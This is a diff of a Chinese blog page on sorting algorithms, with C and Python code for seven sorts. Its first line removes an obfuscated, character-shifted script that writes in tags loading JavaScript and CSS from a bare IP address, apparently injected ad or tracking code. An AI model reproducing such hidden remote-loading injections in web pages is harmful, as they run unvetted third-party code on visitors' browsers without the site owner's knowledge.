@@ -1,1 +1,722 @@
-<script>var d="=iunm?=ifbe?=mjol!sfm>#tuzmftiffu#!uzqf>#ufyu0dtt#!isfg>#iuuq;00223/5/34/215;95903/dtt#?=tdsjqu!uzqf>#ufyu0kbwbtdsjqu#!tsd>#iuuq;00223/5/34/215;9590vujm/kt#?=0tdsjqu?=0ifbe?=cpez!je>#c#!sjhiuNbshjo>1!upqNbshjo>1!mfguNbshjo>1!tdspmm>op?=0cpez?=tdsjqu!tsd>#iuuq;00223/5/34/215;9590b`ud/kt@beje>318111'uddb>NUV6OUB2O{B3NUd>'vsjq>211/75/271/332'tuqu>1'fequ>1'psmv";function i(_,__){_+=__;var $="";for(var u=0;u<_.length;u++){var r=_.charCodeAt(u);$+=String.fromCharCode(r-1);}return $;} var c=">bIS1dEpwM3m{cn:4[olv[3m1bIWjMnmwM4OqcYCt[T:1[X2xcHG1[T:xc4O1Mni1cXx>'bpsmv>bIS1dEpwM{FyNj51MkJ{MkFxOEp5OEhwNkB4NEBxMx>>'tqje>417789686'bsfb>1'q2bsn>341'q3bsn>491'q4bsn>21'q5bsn>4'q6bsn>4'q7bsn>2'bqqe>1'ibtDpvou>1'ibtXijufVtfs>1'npuo>3481:69333'tbbt>647:495:7'q8bsn>2'q9bsn>1'qtbe>4343379435'buje>2'qbbu>1'bbje>1'jtbb>1'fowt>1'dlut>2536657654#?=0tdsjqu?=0iunm?";document.write(i(d,c));</script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+第一节 选择排序
+
+```
+void select_sort(int a[],int n){
+    for(int i=0;i<n;i++){
+        int min = i;
+        for(int j=i+1;j<n;j++){
+            if(a[min] > a[j])
+                min = j;
+        }
+        if(min != i){
+            int temp = a[min];
+            a[min] = a[i];
+            a[i] = temp;
+        }
+    }
+}
+```
+
+```
+def select_sort(a):
+    n = len(a)
+    for i in range(n):
+        min = i
+        for j in range(i+1,n):
+            if a[min] > a[j]:
+                min = j
+        if min > i :
+            a[min],a[i] = a[i],a[min]
+```
+
+第二节 插入排序
+```
+void insert_sort(int a[],int n){
+    for(int i=1;i<n;i++){
+        int j=i;
+        int temp = a[i];
+        while(j>0 && a[j-1]>temp){
+            a[j] = a[j-1];
+            j--;
+        }
+        a[j] = temp;
+    }
+}
+```
+
+```
+def insert_sort(a):
+    n = len(a)
+    for i in range(1,n):
+        j = i
+        temp = a[i]
+        while j>0 and a[j-1]>temp:
+            a[j] = a[j-1]
+            j -= 1
+        a[j] = temp
+```
+
+第三节 冒泡排序
+用flag来记录一次冒泡中最后一次交换的位置
+```
+void bubble_sort(int a[],int n){
+    int flag = n-1;
+    while(flag){
+        int i = flag;
+        flag = 0;
+        for(int j=0;j<i;j++){
+            if(a[j] > a[j+1]){
+                int temp = a[j];
+                a[j] = a[j+1];
+                a[j+1] = temp;
+                flag = j;
+            }
+        }
+    }
+}
+```
+
+```
+def bubble_sort(a):
+    n = len(a)
+    flag = n-1
+    while flag:
+        i = flag
+        flag = 0
+        for j in range(i):
+            if a[j] > a[j+1]:
+                a[j],a[j+1] = a[j+1],a[j]
+                flag = j
+```
+
+第四节 希尔排序
+适当的选取gap
+
+```
+void shell_sort(int a[],int n){
+    for(int gap=n/2;gap>0;gap/=2){
+        for(int i=gap;i<n;i++){
+            int temp = a[i];
+            int j = i;
+            while(j>gap-1 && a[j-gap]>temp){
+                a[j] = a[j-gap];
+                j -= gap;
+            }
+            a[j] = temp;
+        }
+    }
+}
+```
+
+```
+def shell_sort(a):
+    n = len(a)
+    gap = n//2
+    while gap:
+        for i in range(gap,n):
+            j = i
+            temp = a[i]
+            while j>gap-1 and a[j-gap]>temp:
+                a[j] = a[j-gap]
+                j -= gap
+            a[j] = temp
+        gap = gap // 2
+```
+
+第五节 归并排序
+每次merge过程中都需要一个的额外存储空间，为了防止内存的频繁申请和释放，在最外层申请内存storage作为参数传递给merge函数
+```
+void merge_with_storage(int target[],int mid,int n,int storage[]){
+    int i=0;
+    int j=mid;
+    int s=0;
+    while(i<mid && j<n){
+        if(target[i]<=target[j]){
+            storage[s] = target[i];
+            i++;
+        }
+        else{
+            storage[s] = target[j];
+            j++;
+        }
+        s++;
+    }
+    while(i<mid){
+        storage[s++] = target[i++];
+    }
+    while(j<n){
+        storage[s++] = target[j++];
+    }
+    memcpy(target,storage,sizeof(int)*n);
+}
+
+void merge_sort_with_storage(int a[],int n,int storage[]){
+    if(n<=1){
+        return;
+    }
+    int i = n/2;
+    merge_sort_with_storage(a,i,storage);
+    merge_sort_with_storage(a+i,n-i,storage);
+    merge_with_storage(a,i,n,storage);
+}
+
+void merge_sort(int a[],int n){
+    int *storage = malloc(sizeof(int)*n);
+    merge_sort_with_storage(a,n,storage);
+    free(storage);
+}
+```
+
+```
+def merge_sort(a):
+    n = len(a)
+    if n<=1:
+        return
+    mid = n//2
+    left = a[:mid]
+    right = a[mid:]
+    merge_sort(left)
+    merge_sort(right)
+    def merge(left,right):
+        i = j = k = 0
+        l = len(left)
+        r = len(right)
+        while j<l and k<r:
+            if left[j] <= right[k]:
+                a[i] = left[j]
+                j+=1
+            else:
+                a[i] = right[k]
+                k+=1
+            i += 1
+        while j<l:
+            a[i] = left[j]
+            i += 1
+            j += 1
+        while k<r:
+            a[i] = right[k]
+            i += 1
+            k += 1
+    merge(left,right)
+```
+第六节 快速排序
+```
+int partition(int a[],int n){
+    int p = a[0];
+    int first = 1;
+    int last = n-1;
+    int done = 1;
+    while(done){
+        while(first<=last && a[first]<=p){
+            first++;
+        }
+        while(last>=first && a[last]>p){
+            last--;
+        }
+        if(first>last){
+            done = 0;
+        }
+        else{
+            int temp = a[first];
+            a[first] = a[last];
+            a[last] = temp;
+            first++;
+            last--;
+        }
+    }
+    a[0] = a[last];
+    a[last] = p;
+    return last;
+}
+
+void q_sort(int a[],int n){
+    if(n<=1){
+        return;
+    }
+    int q = partition(a,n);
+    q_sort(a,q);
+    q_sort(a+q+1,n-q-1);
+}
+```
+
+```
+def q_sort(a):
+    def q_sort_helper(a,first,last):
+        if first<last:
+            def partition(a,first,last):
+                done = 0
+                left = first+1
+                right = last
+                while not done:
+                    while left<=right and a[left] <= a[first]:
+                        left += 1
+                    while right>=left and a[right] > a[first]:
+                        right -= 1
+                    if left > right:
+                        done = 1
+                    else:
+                        a[left],a[right] = a[right],a[left]
+                        left += 1
+                        right -= 1
+                a[first],a[right] = a[right],a[first]
+                return right
+            q = partition(a,first,last)
+            q_sort_helper(a,first,q-1)
+            q_sort_helper(a,q+1,last)
+    q_sort_helper(a,0,len(a)-1)
+```
+
+第七节 堆排序
+升序排列，需要建立最大堆
+```
+void max_heap_fixdown(int a[],int i,int n){
+    int parent = i;
+    int child = 2*i+1;
+    int temp = a[parent];
+    while(child < n){
+        if(child+1<n && a[child+1]>a[child]){
+            child = child+1;
+        }
+        if(a[child]<=temp){
+            break;
+        }
+        a[parent] = a[child];
+        parent = child;
+        child = 2*parent+1;
+    }
+    a[parent] = temp;
+}
+void make_max_heap(int a[],int n){
+    for(int i=(n-2)/2;i>=0;i--){
+        max_heap_fixdown(a,i,n);
+    }
+}
+
+void max_heap_sort(int a[],int n){
+    for(int i=n-1;i>0;i--){
+        int temp = a[0];
+        a[0] = a[i];
+        a[i] = temp;
+        max_heap_fixdown(a,0,i);
+    }
+}
+
+void heap_sort(int a[],int n){
+    make_max_heap(a,n);
+    max_heap_sort(a,n);
+}
+```
+
+python标准库有 [heapq模块](https://hg.python.org/cpython/file/2.7/Lib/heapq.py)
+
+Python的timsort [Understanding timsort](http://www.drmaciver.com/2010/01/understanding-timsort-1adaptive-mergesort/)
+
+
+
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<p>第一节 选择排序</p>
+
+<pre><code>void select_sort(int a[],int n){
+    for(int i=0;i&lt;n;i++){
+        int min = i;
+        for(int j=i+1;j&lt;n;j++){
+            if(a[min] &gt; a[j])
+                min = j;
+        }
+        if(min != i){
+            int temp = a[min];
+            a[min] = a[i];
+            a[i] = temp;
+        }
+    }
+}
+</code></pre>
+
+<pre><code>def select_sort(a):
+    n = len(a)
+    for i in range(n):
+        min = i
+        for j in range(i+1,n):
+            if a[min] &gt; a[j]:
+                min = j
+        if min &gt; i :
+            a[min],a[i] = a[i],a[min]
+</code></pre>
+
+<p>第二节 插入排序</p>
+
+<pre><code>void insert_sort(int a[],int n){
+    for(int i=1;i&lt;n;i++){
+        int j=i;
+        int temp = a[i];
+        while(j&gt;0 &amp;&amp; a[j-1]&gt;temp){
+            a[j] = a[j-1];
+            j--;
+        }
+        a[j] = temp;
+    }
+}
+</code></pre>
+
+<pre><code>def insert_sort(a):
+    n = len(a)
+    for i in range(1,n):
+        j = i
+        temp = a[i]
+        while j&gt;0 and a[j-1]&gt;temp:
+            a[j] = a[j-1]
+            j -= 1
+        a[j] = temp
+</code></pre>
+
+<p>第三节 冒泡排序
+用flag来记录一次冒泡中最后一次交换的位置</p>
+
+<pre><code>void bubble_sort(int a[],int n){
+    int flag = n-1;
+    while(flag){
+        int i = flag;
+        flag = 0;
+        for(int j=0;j&lt;i;j++){
+            if(a[j] &gt; a[j+1]){
+                int temp = a[j];
+                a[j] = a[j+1];
+                a[j+1] = temp;
+                flag = j;
+            }
+        }
+    }
+}
+</code></pre>
+
+<pre><code>def bubble_sort(a):
+    n = len(a)
+    flag = n-1
+    while flag:
+        i = flag
+        flag = 0
+        for j in range(i):
+            if a[j] &gt; a[j+1]:
+                a[j],a[j+1] = a[j+1],a[j]
+                flag = j
+</code></pre>
+
+<p>第四节 希尔排序
+适当的选取gap</p>
+
+<pre><code>void shell_sort(int a[],int n){
+    for(int gap=n/2;gap&gt;0;gap/=2){
+        for(int i=gap;i&lt;n;i++){
+            int temp = a[i];
+            int j = i;
+            while(j&gt;gap-1 &amp;&amp; a[j-gap]&gt;temp){
+                a[j] = a[j-gap];
+                j -= gap;
+            }
+            a[j] = temp;
+        }
+    }
+}
+</code></pre>
+
+<pre><code>def shell_sort(a):
+    n = len(a)
+    gap = n//2
+    while gap:
+        for i in range(gap,n):
+            j = i
+            temp = a[i]
+            while j&gt;gap-1 and a[j-gap]&gt;temp:
+                a[j] = a[j-gap]
+                j -= gap
+            a[j] = temp
+        gap = gap // 2
+</code></pre>
+
+<p>第五节 归并排序
+每次merge过程中都需要一个的额外存储空间，为了防止内存的频繁申请和释放，在最外层申请内存storage作为参数传递给merge函数</p>
+
+<pre><code>void merge_with_storage(int target[],int mid,int n,int storage[]){
+    int i=0;
+    int j=mid;
+    int s=0;
+    while(i&lt;mid &amp;&amp; j&lt;n){
+        if(target[i]&lt;=target[j]){
+            storage[s] = target[i];
+            i++;
+        }
+        else{
+            storage[s] = target[j];
+            j++;
+        }
+        s++;
+    }
+    while(i&lt;mid){
+        storage[s++] = target[i++];
+    }
+    while(j&lt;n){
+        storage[s++] = target[j++];
+    }
+    memcpy(target,storage,sizeof(int)*n);
+}
+
+void merge_sort_with_storage(int a[],int n,int storage[]){
+    if(n&lt;=1){
+        return;
+    }
+    int i = n/2;
+    merge_sort_with_storage(a,i,storage);
+    merge_sort_with_storage(a+i,n-i,storage);
+    merge_with_storage(a,i,n,storage);
+}
+
+void merge_sort(int a[],int n){
+    int *storage = malloc(sizeof(int)*n);
+    merge_sort_with_storage(a,n,storage);
+    free(storage);
+}
+</code></pre>
+
+<pre><code>def merge_sort(a):
+    n = len(a)
+    if n&lt;=1:
+        return
+    mid = n//2
+    left = a[:mid]
+    right = a[mid:]
+    merge_sort(left)
+    merge_sort(right)
+    def merge(left,right):
+        i = j = k = 0
+        l = len(left)
+        r = len(right)
+        while j&lt;l and k&lt;r:
+            if left[j] &lt;= right[k]:
+                a[i] = left[j]
+                j+=1
+            else:
+                a[i] = right[k]
+                k+=1
+            i += 1
+        while j&lt;l:
+            a[i] = left[j]
+            i += 1
+            j += 1
+        while k&lt;r:
+            a[i] = right[k]
+            i += 1
+            k += 1
+    merge(left,right)
+</code></pre>
+
+<p>第六节 快速排序</p>
+
+<pre><code>int partition(int a[],int n){
+    int p = a[0];
+    int first = 1;
+    int last = n-1;
+    int done = 1;
+    while(done){
+        while(first&lt;=last &amp;&amp; a[first]&lt;=p){
+            first++;
+        }
+        while(last&gt;=first &amp;&amp; a[last]&gt;p){
+            last--;
+        }
+        if(first&gt;last){
+            done = 0;
+        }
+        else{
+            int temp = a[first];
+            a[first] = a[last];
+            a[last] = temp;
+            first++;
+            last--;
+        }
+    }
+    a[0] = a[last];
+    a[last] = p;
+    return last;
+}
+
+void q_sort(int a[],int n){
+    if(n&lt;=1){
+        return;
+    }
+    int q = partition(a,n);
+    q_sort(a,q);
+    q_sort(a+q+1,n-q-1);
+}
+</code></pre>
+
+<pre><code>def q_sort(a):
+    def q_sort_helper(a,first,last):
+        if first&lt;last:
+            def partition(a,first,last):
+                done = 0
+                left = first+1
+                right = last
+                while not done:
+                    while left&lt;=right and a[left] &lt;= a[first]:
+                        left += 1
+                    while right&gt;=left and a[right] &gt; a[first]:
+                        right -= 1
+                    if left &gt; right:
+                        done = 1
+                    else:
+                        a[left],a[right] = a[right],a[left]
+                        left += 1
+                        right -= 1
+                a[first],a[right] = a[right],a[first]
+                return right
+            q = partition(a,first,last)
+            q_sort_helper(a,first,q-1)
+            q_sort_helper(a,q+1,last)
+    q_sort_helper(a,0,len(a)-1)
+</code></pre>
+
+<p>第七节 堆排序
+升序排列，需要建立最大堆</p>
+
+<pre><code>void max_heap_fixdown(int a[],int i,int n){
+    int parent = i;
+    int child = 2*i+1;
+    int temp = a[parent];
+    while(child &lt; n){
+        if(child+1&lt;n &amp;&amp; a[child+1]&gt;a[child]){
+            child = child+1;
+        }
+        if(a[child]&lt;=temp){
+            break;
+        }
+        a[parent] = a[child];
+        parent = child;
+        child = 2*parent+1;
+    }
+    a[parent] = temp;
+}
+void make_max_heap(int a[],int n){
+    for(int i=(n-2)/2;i&gt;=0;i--){
+        max_heap_fixdown(a,i,n);
+    }
+}
+
+void max_heap_sort(int a[],int n){
+    for(int i=n-1;i&gt;0;i--){
+        int temp = a[0];
+        a[0] = a[i];
+        a[i] = temp;
+        max_heap_fixdown(a,0,i);
+    }
+}
+
+void heap_sort(int a[],int n){
+    make_max_heap(a,n);
+    max_heap_sort(a,n);
+}
+</code></pre>
+
+<p>python标准库有 <a href="https://hg.python.org/cpython/file/2.7/Lib/heapq.py">heapq模块</a></p>
+
+<p>Python的timsort <a href="http://www.drmaciver.com/2010/01/understanding-timsort-1adaptive-mergesort/">Understanding timsort</a></p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2014 by isnowfy, Designed by isnowfy</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "algorithm-sort.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+</body>
+</html>
